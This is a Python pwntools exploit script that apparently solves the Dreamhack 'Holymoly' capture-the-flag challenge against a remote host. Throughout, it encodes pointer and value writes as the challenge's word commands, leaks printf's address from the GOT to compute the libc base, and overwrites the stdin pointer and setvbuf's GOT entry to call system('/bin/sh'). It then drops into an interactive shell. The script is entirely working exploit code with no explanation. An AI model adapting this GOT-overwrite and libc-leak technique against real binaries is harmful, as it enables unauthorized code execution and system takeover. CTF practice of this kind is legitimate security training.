from pwn import *

port = 20300
rem = remote("host8.dreamhack.games", port)

lib = ELF("./Pwnable/Holymoly/problem/libc-2.31.so")
elf = ELF("./Pwnable/Holymoly/problem/holymoly")

increase_0x1000 = b"holymoly"
increase_0x100 = b"rolypoly"
increase_0x10 = b"monopoly"
increase_0x1 = b"guacamole"

decrease_0x1000 = b"robocarpoli"
decrease_0x100 = b"halligalli"
decrease_0x10 = b"broccoli"
decrease_0x1 = b"bordercollie"

read_cmd = b"blueberry"
write_cmd = b"cranberry"
switch_cmd = b"mystery"

ptr = 0
val = 0
isPtr = False

def make_cmd(target_num, forPtr):
  cmd = b""
  global isPtr, ptr, val
  if (forPtr and not isPtr) or (not forPtr and isPtr):
    cmd += switch_cmd
    isPtr = not isPtr
  if forPtr:
    diff = target_num - ptr
    ptr = target_num
  else:
    diff = target_num - val
    val = target_num
  val_list = [0x1000, 0x100, 0x10, 0x1]
  if diff >= 0:
    op_list = [increase_0x1000, increase_0x100, increase_0x10, increase_0x1]
  else:
    op_list = [decrease_0x1000, decrease_0x100, decrease_0x10, decrease_0x1]
    diff = -diff
  for i in range(4):
    cmd += op_list[i] * (diff // val_list[i])
    diff %= val_list[i]
  return cmd


printf_got = elf.got['printf']
puts_got = elf.got['puts']
stdin_got = elf.got['stdin']
setvbuf_got = elf.got['setvbuf']
main_addr = 0x4011f6

payload = make_cmd(printf_got, forPtr=True)
payload += read_cmd
payload += make_cmd(puts_got, forPtr=True)
payload += make_cmd(main_addr, forPtr=False)
payload += write_cmd

rem.sendlineafter(b"? ", payload)
lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) - lib.symbols['printf']
sys_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + next(lib.search(b"/bin/sh"))

ptr = 0
val = 0
isPtr = False

bits = (binsh_addr & 0x00000000ffff)
payload = make_cmd(stdin_got, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = (binsh_addr & 0x0000ffff0000) >> 16
payload += make_cmd(stdin_got + 2, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = (binsh_addr & 0xffff00000000) >> 32
payload += make_cmd(stdin_got + 4, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd

bits = (sys_addr & 0x00000000ffff)
payload += make_cmd(setvbuf_got, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = (sys_addr & 0x0000ffff0000) >> 16
payload += make_cmd(setvbuf_got + 2, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd
bits = (sys_addr & 0xffff00000000) >> 32
payload += make_cmd(setvbuf_got + 4, forPtr=True)
payload += make_cmd(bits, forPtr=False)
payload += write_cmd

rem.sendlineafter(b"? ", payload)

rem.interactive()